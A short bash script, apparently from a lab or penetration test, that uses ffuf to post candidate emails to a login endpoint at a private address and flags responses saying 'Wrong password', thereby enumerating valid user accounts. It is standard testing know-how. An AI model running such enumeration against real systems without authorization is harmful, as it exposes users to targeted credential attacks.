#!/bin/bash

# will show the existing users from users.txt
echo "Existing users from users.txt (we match regex with the response body):"
ffuf -s -w users.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email": "FUZZ", "password": "ThisIsNotThePassword"}' \
  -u http://192.168.200.1:8082/auth/login \
  -mr "Wrong password"
